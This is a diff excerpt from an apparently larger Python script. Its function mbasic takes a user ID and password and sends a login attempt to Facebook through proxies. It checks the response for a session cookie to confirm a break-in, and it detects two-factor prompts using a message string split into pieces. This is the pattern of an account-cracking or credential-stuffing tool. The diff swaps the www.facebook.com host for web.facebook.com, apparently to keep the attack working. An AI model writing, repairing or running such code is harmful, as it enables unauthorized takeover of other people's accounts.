@@ -1249,11 +1249,11 @@ def mbasic(uid,pwx,tl):
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
-            'Referer': 'https://www.facebook.com/',
+            'Referer': 'https://web.facebook.com/',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.facebook.com',
+            'Origin': 'https://web.facebook.com',
             'DNT': '1',
-            'Alt-Used': 'www.facebook.com',
+            'Alt-Used': 'web.facebook.com',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
@@ -1264,7 +1264,7 @@ def mbasic(uid,pwx,tl):
             'Pragma': 'no-cache',
             'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092'
+            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False, proxies=proxs).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
